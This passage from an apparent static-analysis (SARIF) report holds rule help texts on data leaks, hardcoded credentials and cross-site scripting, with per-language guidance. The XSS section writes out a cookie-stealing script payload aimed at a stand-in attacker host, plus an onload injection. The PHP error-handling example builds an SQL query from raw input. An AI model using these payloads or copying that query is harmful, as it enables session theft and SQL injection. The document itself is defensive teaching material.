}\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. Here a generic error message is shown to the user, while the detailed error is written to the logs for investigation:\n\n```scala\n  override def onServerError(request: RequestHeader, exception: Throwable): Future[Result] = {\n    try {\n      val usefulException = HttpErrorHandlerExceptions.throwableToUsefulException(sourceMapper, !config.showDevErrors, exception)\n\n      // Write the full error context and stack trace to the log file.\n      logServerError(request, usefulException)\n\n      // Sanitize the error to be displayed to the user, when in production-mode.\n      if (config.showDevErrors) onDevServerError(request, usefulException)\n      else onProdServerError(request, usefulException)\n    } catch {\n      case NonFatal(e) =>\n        logger.error(\"Error while handling error\", e)\n        Future.successful(InternalServerError(fatalErrorMessage(request, e)))\n    }\n  }\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. In the Play framework, static assets like JavaScript and CSS files are \ntypically kept in a separate `/public` and mapped in the routes file as follows:\n\n```scala\nGET  /assets/*file        controllers.Assets.at(path=\"/public\", file)\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. For example, the Akka web-server allows you to disable these headers through configuration options:\n\n```\nakka.http {\n  server {\n    # The default value of the `Server` header to produce if no\n    # explicit `Server`-header was included in a response.\n    # If this value is the empty string and no header was included in\n    # the request, no `Server` header will be rendered at all.\n    server-header = \"\" # akka-http/${akka.http.version}\n  }  \n}\n```\n\n:::\n\n:::tab[Go]\n\n## How to Prevent Data Leaks in Go\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. In Go web applications, you typically end up writing\nyour own error pages. Ensure that any pages that handle errors pay use flags to distinguish the environment they are \nexecuting in:\n\n```go\nimport \"flag\"\n\nvar debug = flag.Bool(\"debug\", false, \"Whether to show full error messages on the client\")\n```\n\nA default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page can show more information, like full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. Go functions typically return error codes when then fail, and web handlers will return early when error conditions \noccur. Ensure such code does not leak sensitive system data.\n\n```go\nsession, err := session.Get(request, \"session\")\n\nif err != nil {\n  // The second argument here is returned directly to the client, which leaks information!\n  http.Error(response, err.Error(), http.StatusInternalServerError)\n  return\n}\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. Here's how to specify the directory containing static files (like JavaScript \ncode and images) in the Gorilla web framework:\n\n```go\nfunc main() {\n  var dir string\n\n  flag.StringVar(&dir, \"dir\", \".\", \"the directory to serve files from. Defaults to the current dir\")\n  flag.Parse()\n  router := mux.NewRouter()\n\n  // This will serve files under http://localhost:8000/static/<filename>\n  router.PathPrefix(\"/static/\").Handler(http.StripPrefix(\"/static/\", http.FileServer(http.Dir(dir))))\n\n  server := &http.Server{\n    Handler: router,\n    Addr:    \"127.0.0.1:8000\"\n  }\n\n  log.Fatal(server.ListenAndServe())\n}\n```\n\n:::\n\n:::tab[PHP]\n\n## How to Prevent Data Leaks in PHP\n\n### Keep Error Reporting on the Server\n\nDisable error reporting to the client in your production environment by setting the `display_errors` directive to `Off` in your `php.ini`:\n\n```ini\ndisplay_errors = Off\n```\n\nYou should instead log the errors for review. Ensure that `log_errors` directive is set to `On`:\n\n```ini\nlog_errors = On\nerror_log = /path/to/php-error.log\n```\n\n### Sanitize Error Messages\n\nAvoid directly echoing out database or system error messages to the user. Instead, present a generic message while logging the exact error for debugging:\n\n```php\ntry \n{\n    $result = $db->query(\"SELECT * FROM users WHERE email = '$email'\");\n}\ncatch (PDOException $e) \n{\n    error_log(\"Database error: \" . $e->getMessage());\n    echo \"An unexpected error occurred, please try again later.\";\n}\n```\n\n### Separate Dynamic and Static Resources\n\nFor websites or web applications using PHP, it's common to store PHP files in one directory and static resources (e.g., images, stylesheets, and JavaScript files) in separate directories. This way, you can use server configurations to ensure direct access to PHP files is restricted.\n\n### Hide PHP Version Information\n\nThe `X-Powered-By` header can give away the PHP version you're running. To hide this:\n\n1. Edit `php.ini` and update:\n\n```ini\nexpose_php = Off\n```\n\nOr, if you're using an `.htaccess` file on an Apache server:\n\n```apache\nHeader unset X-Powered-By\n```\n\n### Be Careful With Comments\n\nAvoid leaving sensitive or internal-only comments in your PHP files. Even if you think they are in a part of the code that doesn't output to the user, mistakes or changes in the codebase could expose them. Always assume that anything in a code file could potentially be exposed.\n\n:::\n\n::::\n\n## Further Considerations\n\n* Ensure any comments in template files don't contain sensitive data! It's easy to leave in notes about server names\n  and addresses that will get passed to the client-side. Attackers know this, and will scan comments in HTML for IP\n  addresses and URLs.\n  \n* Ensure server-side log messages do not contain sensitive information like passwords or credit card numbers - this \n  should mitigate the harm an attacker can do if they manage to steal your server's log files.\n  \n\n## Additional information\n\n**[CWE-200](https://cwe.mitre.org/data/definitions/200.html)**\n\n**[OWASP-A3](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure)**",
                                "text": "Sensitive data is logged in this flow.\n\n# Sensitive Data Leaks\n\nDisclosing system information helps an adversary learn about your web application and form a plan of attack. You should\ntry to reveal as little about your technology stack and architecture as possible, beyond what is essential for your\nusers to know. Revealing system information makes life easier for an attacker, and gives them a playbook of\nvulnerabilities they can probe for.\n\nHere are some common ways websites leak sensitive data:\n\n* Error conditions that display stack traces or database error messages to the user.\n* Open directory listings that allow exploration of the server's file system.\n* Unsanitized comments in HTML and template files the reveal system details.\n\n::::tabs\n\n:::tab[Java]\n\n## How to Prevent Data Leaks in Java\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment, by specifying an error page in your `web.xml` file:\n\n```xml\n<error-page>\n  <location>/error.html</location>\n</error-page>\n```\n  \nThis error page should only contain a generic error message (e.g. \"An error occurred\"). Stack traces should be written\nto server-side logs.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the\nuser. Here a generic error message is shown to the user, while the detailed error is written to the logs for investigation:\n\n```java\ntry \n{\n    user = getDatabase().findUser(email);\n}\ncatch (SQLException ex) \n{\n    log.error(\"An error occurred looking up the user profiles\", ex):\n    throw new ClientFacingException(\"An unexpected error occurred, please try again later.\");\n}\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. For example, this is how to tell Java to server static Javascript files\nfrom the `/js` directory:\n  \n```xml\n<servlet-mapping>\n    <servlet-name>default</servlet-name>\n    <url-pattern>/js/*.js</url-pattern>\n</servlet-mapping>\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. Here's how to do that in the Jetty web-server:\n  \n```java\nHttpConfiguration.setSendServerVersion(false);\n```\n\n:::\n\n:::tab[C#]\n\n## How to Prevent Data Leaks in C#\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. When you create a new ASP.NET application, the \ntemplate will generate a startup class with some configuration logic:\n\n```csharp\n    public void Configure(IApplicationBuilder app, IWebHostEnvironment env)\n    {\n        if (env.IsDevelopment())\n        {\n            app.UseDeveloperExceptionPage();\n        }\n        else\n        {\n            app.UseExceptionHandler(\"/Home/Error\");\n        }\n    }\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. When running in non-development mode the ASP.NET web-server will show a generic error message to the user, while \nthe detailed error is written to the logs for investigation. You can configure the error page that is generated at\n`/Views/Shared/Errors.cs.html`.\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. An ASP.NET web application can be configured to serve static content under\nthe `wwwroot` directory by adding the following line in the startup configuration:\n\n```csharp\napp.UseStaticFiles();\n```\n\nYou can also add additional static content directories with the following logic:\n\n```csharp\napp.UseStaticFiles(new StaticFileOptions\n{\n    FileProvider = new PhysicalFileProvider(Path.Combine(env.ContentRootPath, \"MyStaticFiles\")),\n    RequestPath = \"/StaticFiles\"\n});\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. In ASP.NET, you can programmatically remove it in the following manner:\n\n```csharp\nHttpContext.Current.Response.Headers.Remove(\"Server\");\n```\n\nIf you are deploying to IIS, you can remove the header in your configuration settings:\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<configuration>\n    <system.webServer>\n        <security>\n            <requestFiltering removeServerHeader=\"true\" />\n        </security>\n    </system.webServer>\n</configuration>\n```\n\n:::\n\n:::tab[JavaScript]\n\n## How to Prevent Data Leaks in JavaScript\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. This Express server will dump stack trace \ninformation only in the `development` environment, and disable it in `production`:\n  \n```javascript\nconst errorhandler = require('errorhandler')\nconst express      = require('express')\n\nconst app = express()\n\napp.use(errorhandler({\n  dumpExceptions : app.get('env') === 'development',\n  showStack      : app.get('env') === 'development'\n}))\n```\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database are logged, but not shown to the user. Here a generic error \nmessage is shown to the user, while the detailed error is written to the logs for investigation:\n\n```javascript\napp.get('/profile', (request, response) => {\n  db.run('SELECT * FROM USERS WHERE email = ?', [ request.session.user ], (error, user) => {\n    if (error) {\n      log.error(error)\n      response.send('An unexpected error occurred')\n      return\n    }\n\n    response.send(`<p>Your email is ${user.email}</p>`)\n  })\n})\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. For example, this is how to tell Expression to server static content (like \nclient-side JavaScript and CSS files) from the `/static` directory:\n  \n```javascript\napp.use(express.static(__dirname + '/static'))\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. Here's how to do that in Express:\n  \n```javascript\n// Disable the 'X-Powered-By' header.\napp.disable('x-powered-by')\n\nconst cookieParser = require('cookie-parser')\nconst session      = require('express-session')\n\napp.use(cookieParser('secret'))\napp.use(session({\n  cookie : {\n    maxAge   : 60000,\n    httpOnly : true,\n    sameSite : 'strict',\n    secure   : app.get('env') !== 'development'\n  },\n\n  // Make the session cookie name generic.\n  name   : 'session',\n  secret : process.env.SESSION_SECRET || uid.sync(18)\n}))\n```\n\n:::\n\n:::tab[Python]\n\n## How to Prevent Data Leaks in Python\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. Observe how the Flask framework uses different error\npages in development and production modes, distinguished by whether the environment variable `FLASK_ENV` is set to\n`development`:\n\n```python\n  @property\n  def debug(self) -> bool:\n     \"\"\"Whether debug mode is enabled. When using ``flask run`` to start\n     the development server, an interactive debugger will be shown for\n     unhandled exceptions, and the server will be reloaded when code\n     changes. This maps to the :data:`DEBUG` config key. This is\n     enabled when :attr:`env` is ``'development'`` and is overridden\n     by the ``FLASK_DEBUG`` environment variable. It may not behave as\n     expected if set in code.\n\n     **Do not enable debug mode when deploying in production.**\"\"\"\n     return self.config[\"DEBUG\"]\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces, and even allow interactive execution of Python code.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. When running in non-development mode the Flask web-server will show a generic error message to the user, while \nthe detailed error is written to the logs for investigation:\n\n```python\n  def log_exception(self, exc_info) -> None:\n    \"\"\"Logs an exception.  This is called by :meth:`handle_exception`\n    if debugging is disabled and right before the handler is called.\n    The default implementation logs the exception as error on the\n    :attr:`logger`.\n    \"\"\"\n    self.logger.error(\n        f\"Exception on {request.path} [{request.method}]\", exc_info=exc_info\n    )\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. Here's how to specify the directory containing static files (like JavaScript \ncode and images) in the Flask web-server:\n\n```python\nfrom flask import Flask\n\napp = Flask(__name__, static_folder='static')\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. In the Gunicorn WSGI container, you can configure this header in your `gunicorn.conf.py` config \nfile:\n\n```python\nimport gunicorn\n\n# Make the server name completely generic.\ngunicorn.SERVER_SOFTWARE = 'Server'\n```\n\n:::\n\n:::tab[Scala]\n\n## How to Prevent Data Leaks in Scala\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. Notice how the Play framework uses different error\npages in development and production modes:\n\n```scala\n  /**\n   * Invoked in dev mode when a server error occurs.\n   */\n  protected def onDevServerError(request: RequestHeader, exception: UsefulException): Future[Result] = {\n    Future.successful {\n      implicit val ir: RequestHeader = request\n      InternalServerError(views.html.defaultpages.devError(playEditor, exception))\n    }\n  }\n\n  /**\n   * Invoked in prod mode when a server error occurs.\n   */\n  protected def onProdServerError(request: RequestHeader, exception: UsefulException): Future[Result] =\n    Future.successful {\n      implicit val ir: RequestHeader = request\n      InternalServerError(views.html.defaultpages.error(exception))\n    }\n```\n\nThe default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page will log full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. Here a generic error message is shown to the user, while the detailed error is written to the logs for investigation:\n\n```scala\n  override def onServerError(request: RequestHeader, exception: Throwable): Future[Result] = {\n    try {\n      val usefulException = HttpErrorHandlerExceptions.throwableToUsefulException(sourceMapper, !config.showDevErrors, exception)\n\n      // Write the full error context and stack trace to the log file.\n      logServerError(request, usefulException)\n\n      // Sanitize the error to be displayed to the user, when in production-mode.\n      if (config.showDevErrors) onDevServerError(request, usefulException)\n      else onProdServerError(request, usefulException)\n    } catch {\n      case NonFatal(e) =>\n        logger.error(\"Error while handling error\", e)\n        Future.successful(InternalServerError(fatalErrorMessage(request, e)))\n    }\n  }\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. In the Play framework, static assets like JavaScript and CSS files are \ntypically kept in a separate `/public` and mapped in the routes file as follows:\n\n```scala\nGET  /assets/*file        controllers.Assets.at(path=\"/public\", file)\n```\n\n### Disable the \"Server\" Header \n\nConsider disabling the `Server` header and the (non-standard but common) `X-Powered-By` header, and making the session \ncookie name generic. This will give your keep an attacker guessing about what your technology stack is, which makes \nattacking it harder. For example, the Akka web-server allows you to disable these headers through configuration options:\n\n```\nakka.http {\n  server {\n    # The default value of the `Server` header to produce if no\n    # explicit `Server`-header was included in a response.\n    # If this value is the empty string and no header was included in\n    # the request, no `Server` header will be rendered at all.\n    server-header = \"\" # akka-http/${akka.http.version}\n  }  \n}\n```\n\n:::\n\n:::tab[Go]\n\n## How to Prevent Data Leaks in Go\n\n### Keep Error Reporting on the Server\n\nDisable client-side error reporting in your production environment. In Go web applications, you typically end up writing\nyour own error pages. Ensure that any pages that handle errors pay use flags to distinguish the environment they are \nexecuting in:\n\n```go\nimport \"flag\"\n\nvar debug = flag.Bool(\"debug\", false, \"Whether to show full error messages on the client\")\n```\n\nA default error page only contain a generic error message (e.g. \"An error occurred\"), whereas the development-mode\nerror page can show more information, like full stack traces.\n\n### Sanitize Error Messages\n\nMake sure error messages returned from the database or containing system information are logged, but not shown to the \nuser. Go functions typically return error codes when then fail, and web handlers will return early when error conditions \noccur. Ensure such code does not leak sensitive system data.\n\n```go\nsession, err := session.Get(request, \"session\")\n\nif err != nil {\n  // The second argument here is returned directly to the client, which leaks information!\n  http.Error(response, err.Error(), http.StatusInternalServerError)\n  return\n}\n```\n\n### Separate Dynamic and Static Resources\n\nEnsure static resources and dynamic content are stored in separate directories, so a malicious user cannot snoop \nthrough your code and configuration files. Here's how to specify the directory containing static files (like JavaScript \ncode and images) in the Gorilla web framework:\n\n```go\nfunc main() {\n  var dir string\n\n  flag.StringVar(&dir, \"dir\", \".\", \"the directory to serve files from. Defaults to the current dir\")\n  flag.Parse()\n  router := mux.NewRouter()\n\n  // This will serve files under http://localhost:8000/static/<filename>\n  router.PathPrefix(\"/static/\").Handler(http.StripPrefix(\"/static/\", http.FileServer(http.Dir(dir))))\n\n  server := &http.Server{\n    Handler: router,\n    Addr:    \"127.0.0.1:8000\"\n  }\n\n  log.Fatal(server.ListenAndServe())\n}\n```\n\n:::\n\n:::tab[PHP]\n\n## How to Prevent Data Leaks in PHP\n\n### Keep Error Reporting on the Server\n\nDisable error reporting to the client in your production environment by setting the `display_errors` directive to `Off` in your `php.ini`:\n\n```ini\ndisplay_errors = Off\n```\n\nYou should instead log the errors for review. Ensure that `log_errors` directive is set to `On`:\n\n```ini\nlog_errors = On\nerror_log = /path/to/php-error.log\n```\n\n### Sanitize Error Messages\n\nAvoid directly echoing out database or system error messages to the user. Instead, present a generic message while logging the exact error for debugging:\n\n```php\ntry \n{\n    $result = $db->query(\"SELECT * FROM users WHERE email = '$email'\");\n}\ncatch (PDOException $e) \n{\n    error_log(\"Database error: \" . $e->getMessage());\n    echo \"An unexpected error occurred, please try again later.\";\n}\n```\n\n### Separate Dynamic and Static Resources\n\nFor websites or web applications using PHP, it's common to store PHP files in one directory and static resources (e.g., images, stylesheets, and JavaScript files) in separate directories. This way, you can use server configurations to ensure direct access to PHP files is restricted.\n\n### Hide PHP Version Information\n\nThe `X-Powered-By` header can give away the PHP version you're running. To hide this:\n\n1. Edit `php.ini` and update:\n\n```ini\nexpose_php = Off\n```\n\nOr, if you're using an `.htaccess` file on an Apache server:\n\n```apache\nHeader unset X-Powered-By\n```\n\n### Be Careful With Comments\n\nAvoid leaving sensitive or internal-only comments in your PHP files. Even if you think they are in a part of the code that doesn't output to the user, mistakes or changes in the codebase could expose them. Always assume that anything in a code file could potentially be exposed.\n\n:::\n\n::::\n\n## Further Considerations\n\n* Ensure any comments in template files don't contain sensitive data! It's easy to leave in notes about server names\n  and addresses that will get passed to the client-side. Attackers know this, and will scan comments in HTML for IP\n  addresses and URLs.\n  \n* Ensure server-side log messages do not contain sensitive information like passwords or credit card numbers - this \n  should mitigate the harm an attacker can do if they manage to steal your server's log files.\n  \n\n## Additional information\n\n**[CWE-200](https://cwe.mitre.org/data/definitions/200.html)**\n\n**[OWASP-A3](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure)**"
                            },
                            "helpUri": "https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A3-Sensitive_Data_Exposure",
                            "id": "sensitive-to-log/217679579f7afe20ba8bcab68d8f8693",
                            "name": "Sensitive Data Leak: Sensitive Data Is Leaked To Log In Login.js:login",
                            "properties": {
                                "precision": "very-high",
                                "security-severity": "8",
                                "tags": [
                                    "ng-sast",
                                    "CVSS 8",
                                    "CWE 117",
                                    "CWE 200",
                                    "OWASP 2021 a01-broken-access-control",
                                    "OWASP a01-2021-broken-access-control",
                                    "OWASP a3-sensitive-data-exposure",
                                    "Sensitive Data Leak"
                                ]
                            },
                            "shortDescription": {
                                "text": "Sensitive Data Leak: Sensitive Data is Leaked to Log in Login.js:login"
                            }
                        },
                        {
                            "defaultConfiguration": {
                                "enabled": true,
                                "level": "note",
                                "rank": -1
                            },
                            "fullDescription": {
                                "text": "Credentials are hardcoded, allowing everyone with access to the source code or compilation."
                            },
                            "help": {
                                "markdown": "Credentials are hardcoded, allowing everyone with access to the source code or compilation\n artifacts to impersonate the application and access protected data or systems.\n ## Countermeasures\n - Retrieve credentials from a secured location only accessible from the production environment.\n ## Additional information\n **[CWE-259](https://cwe.mitre.org/data/definitions/259.html)**\n **[CWE-798](https://cwe.mitre.org/data/definitions/798.html)**\n **[OWASP-a3](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_a3-Sensitive_Data_Exposure)**",
                                "text": "Credentials are hardcoded, allowing everyone with access to the source code or compilation\n artifacts to impersonate the application and access protected data or systems.\n ## Countermeasures\n - Retrieve credentials from a secured location only accessible from the production environment.\n ## Additional information\n **[CWE-259](https://cwe.mitre.org/data/definitions/259.html)**\n **[CWE-798](https://cwe.mitre.org/data/definitions/798.html)**\n **[OWASP-a3](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_a3-Sensitive_Data_Exposure)**"
                            },
                            "helpUri": "https://cwe.mitre.org/data/definitions/259.html",
                            "id": "hardcoded-credentials/1f0b6912fdd2ca0330277d63a3a2a1ac",
                            "name": "Hardcoded Credentials: Hardcoded Credentials Used In Authentication Or Encryption Operation In Server.js",
                            "properties": {
                                "precision": "very-high",
                                "security-severity": "3",
                                "tags": [
                                    "ng-sast",
                                    "CVSS 3",
                                    "CWE 259",
                                    "CWE 798",
                                    "Hardcoded Credentials",
                                    "OWASP 2021 a07-identification-and-authentication-failures",
                                    "OWASP a07-2021-identification-and-authentication-failures",
                                    "OWASP a3-sensitive-data-exposure"
                                ]
                            },
                            "shortDescription": {
                                "text": "Hardcoded Credentials: Hardcoded Credentials Used in Authentication or Encryption Operation in server.js"
                            }
                        },
                        {
                            "defaultConfiguration": {
                                "enabled": true,
                                "level": "error",
                                "rank": -1
                            },
                            "fullDescription": {
                                "text": "This HTML content is not a string literal. When unescaped attacker-controlled inputs are used as part of HTML content this indicates a Cross-Site Scripting vulnerability."
                            },
                            "help": {
                                "markdown": "This HTML content is not a string literal. When unescaped attacker-controlled inputs are used as part of HTML content this indicates a Cross-Site Scripting vulnerability.\n\n# Cross-Site Scripting\n\nA **Cross-site scripting** (XSS) vulnerability allows an attacker to execute\nJavaScript code in an HTML document rendered by a victim. As a result, the\nattacker can then for example impersonate the victim user to perform arbitrary actions\nprovided by the web application, or exfiltrate and modify sensitive data that is otherwise only accessible to the victim.\n\n## Anatomy of an XSS Attack\n\nThe nature of web applications requires them to process and handle HTML content, which often dynamically incorporates external data. Applications must correctly escape or sanitize all such dynamic content to prevent **XSS attacks**. The most common types of XSS vulnerabilities are:\n\n### Reflected XSS\n\nReflected Cross-Site scripting attack happens in multiple steps:\n\n1. An attacker gets a victim to send data of the attacker's choosing to a website - for example by redirecting them to a URL of\n   the attacker's choosing.\n2. The application includes this untrusted data in an HTML document it sends in response (*reflecting* the data), without taking correct steps to disarm it.\n3. The victim's browser executes JavaScript code of the attacker's choosing.\n\nAs an example let's take a web application that displays the contents of the `search` query parameter in the URL. When an attacker sends a link to a victim to get them to visit a URL like\n\n    https://your-website.invalid/?search=<script>location.href=\"https://attacker-owned.invalid/?\"+document.cookie</script>\n\nIf the HTML response contains this `<script>` tag as-is and the victim clicks on the link, the victim's browser executes this JavaScript code. The JavaScript snippet in this example sends the victim's cookies on your website back to the attacker - on many sites that allows the attacker to take over the active log-in of the victim and impersonate them.\n\n\n### Stored XSS\n\nA Stored Cross-Site Scripting vulnerability happens when the following things come together:\n\n1. An application persists / stores untrusted data, for example in a database. An attacker gets the application to store some HTML and JavaScript code.\n2. The application later retrieves this stored data and includes it as part of an HTML document. (And the application does not take correct steps to disarm the attacker-controlled data.)\n3. A victim views such an HTML page. Their browser executes the attacker-chosen JavaScript code.\n\nFor example, a social-network type website may allow users to set the avatar that is displayed next to their name on their profile or next to their posts to an arbitrary URL of an image file. This website stores this URL in a database and includes the URL as-is in an HTML tag `<img src=\"...\">`. An attacker with user-id `1337` specifies this URL for their avatar:\n\n    https://somewhere.invalid/their-picture.jpg\" onload=\"addUserToFriendsList(1337)\n\nto get the application to generate this resulting HTML code:\n\n```html\n<img src=\"https://somewhere.invalid/their-picture.jpg\" onload=\"addUserToFriendsList(1337)\">\n```\n\nWhenever someone looks at the profile of the attacker, their browser executes the JavaScript code that adds the attacker to the victim's friend list without further user interaction.\n\n\n### DOM-Based XSS\n\nWith **DOM-based XSS vulnerabilities** the HTML code that is generated in the backend is safe by itself. Instead, the vulnerability is in JavaScript frontend code that inserts untrusted data into the browser **Document Object Model** (DOM) in an insecure manner.\n\nA **DOM-based XSS vulnerability** can be either **reflected** or **stored** - depending on how the untrusted data is transmitted by an attacker.\n\nWe can revisit the social-network example for **stored XSS** - a site that uses a JavaScript snippet like this would be vulnerable to the same attack:\n\n```javascript\n$.get(\"user/1337/profile\", res => $(\"#avatar\").html(`<img src=\"${res.avatarURL}\">`));\n```\n\n(This snippet performs an HTTP GET request to request the user's profile information. It insecurely includes the result when rendering a snippet of HTML.)\n\n### Cross-Site Scripting Beside the Web\n\nApplications that are not websites at all still often use HTML (or related technologies that are also susceptible to XSS) to display formatted text to users - whether they are mobile applications, desktop applications or embedded. These applications must be just as careful when including dynamic data in the HTML they generate.\n\nIn fact, the impact of an XSS attack against such applications is often even more disastrous. The HTML views such applications use are generally not meant to protect the application or user against malicious JavaScript. Instead, they have powerful non-standard JavaScript APIs that can allow an attacker to take complete control of the application and computer.\n\nThere are endless potential scenarios for such problems. Here are some examples to spark your imagination:\n\n- a messenger app executing scripts within messages from other users\n- an ebook reader executing JavaScript from code samples in a book about JavaScript\n- a Wi-Fi network selection list names executing scripts from the name of access points\n\nThe root problem is the same as for websites - whenever you include dynamic content in HTML and the source of this dynamic data cannot be trusted 100%, XSS attacks can happen. And on the flip-side, the same techniques and best practices protect against such vulnerabilities.\n\n## Preventing XSS Attacks\n\nThere are multiple approaches to prevent XSS attacks.\n\nBest practice is to use **secure-by-default web frameworks and templating engines** for generating or modifying HTML. For these you only need to think about the possibility of a XSS vulnerability because data is not fully trusted in the places where explicitly output raw HTML.\n\nThe next-best option is to manually HTML-**escape** all dynamic data that you include in an HTML document. This approach is secure in principle but has several downsides:\n\n- it is easy to forget to escape some untrusted data - even if you remember to do it correctly *almost* everywhere\n- untrusted inputs can take very long-winded paths before getting output again - a developer just needs to overlook one such path to fool themselves to think escaping is not needed when it actually is\n- it violates the don't-repeat-yourself (DRY) principle, requiring boilerplate code in every place an application adds dynamic data to HTML content\n\nWhen you decide to use escaping, be wary of when you escape data from untrusted inputs: subsequent encoding, decoding or other text manipulation operations on already-escaped strings can inadvertently reintroduce some way for an attacker to thwart the protection from that earlier HTML-escaping operation - it is therefore generally best to wait until the last possible moment to do HTML-escaping.\n\nSometimes you have text that is not fully trusted and is already in HTML format. The previous options do not work in that case. Instead, you need to **sanitize** the HTML so that benign HTML formatting is passed through but nothing that can be abused by an attacker. This should be an **option of last resort**. Attackers regularly come up with novel ways to render sanitization useless. If you do go with it, we have a few tips:\n\n- Use a well-known HTML sanitization library! There are many non-obvious ways HTML can contain JavaScript code. Do not believe you know and remember of all of them.\n- Rigorously keep up with updates for the HTML sanitizer you use! Updates will often fix ways attackers can bypass the sanitization, or add support for some new browser features that in some way can lead to JavaScript execution.\n- Be as restrictive as possible! HTML sanitization libraries can generally be configured as to which HTML constructs should be allowed and which should not. Give attackers as little wiggle-room to find a way around the sanitization as possible.\n- Use mitigations for Cross-Site Scripting from the next section.\n\n\n## Mitigating Cross-Site Scripting Attacks\n\nThere are several things you can do to lower the impact of XSS vulnerabilities but not quite to the point of solving the problem completely. You should not rely on them as sole protection, yet they are a useful defense-in-depth measure in case something goes wrong.\n\nYou can use the `Content-Security-Policy` (CSP) HTTP header to instruct browsers not to execute JavaScript code except in places you explicitly allow. A restrictive **Content Security Policy** is effective in stopping XSS attacks in otherwise vulnerable websites. But sufficiently restrictive policies also disable many useful features of the web platform. As a result, policies seen in practice often still allow some subset of attacks to go through. Try to remain as strict as possible in what you allow in your **content security policies**.\n\nWhen you know you show HTML content to users that you do not fully trust (e.g. you used sanitization or sourced it from a partner company), consider loading it within an `<iframe>` with the `sandbox` attribute. This attribute allows you to instruct the browser to disable various dangerous features and allows you to limit the ways content inside the **sandbox** can interact with your regular site. \n\nXSS filters in browsers, middleware or application firewalls have severe limitations. They can provide some protection against well-known exploits in off-the-shelf software. But attackers regularly find ways to bypass these tools. Most browsers have removed or never implemented builtin XSS filters because there actually are cases where they create vulnerabilities in sites that are otherwise secure. Similar problems fundamentally also apply to server-side filters when they don't just block possible exploit attempts but are supposed to neutralize them.\n\n\n::::tabs\n\n:::tab[Java]\n\n## XSS Protection in JSP\n\nJava Server Pages (JSP) do **not** protect against Cross-Site Scripting by default. The following example is vulnerable to XSS attacks if users can freely choose their names:\n\n```html\n<h1>Hello, ${user.name}</h1><!-- bad: users can inject HTML code here -->\n```\n\nInstead, in JSP you must use one of these two more verbose ways to output dynamic data in order to prevent XSS attacks:\n\n```html\n<%@ taglib uri=\"http://java.sun.com/jsp/jstl/core\" prefix=\"c\" %>\n<h1>Hello, <c:out value=\"${user.name}\"/></h1>\n```\n\n```html\n<%@ taglib uri=\"http://java.sun.com/jsp/jstl/functions\" prefix=\"fn\" %>\n<h1>Hello, ${fn:escapeXml(user.name)}</h1>\n```\n\nNote that a lot of information from the JSP and servlet context is attacker-controlled, so don't forget to escape this data.\n\n## XSS Protection in Regular Java\n\nIf your code manually constructs HTML (e.g. in a servlet) you need to escape any dynamic content before writing it. For example, you may use 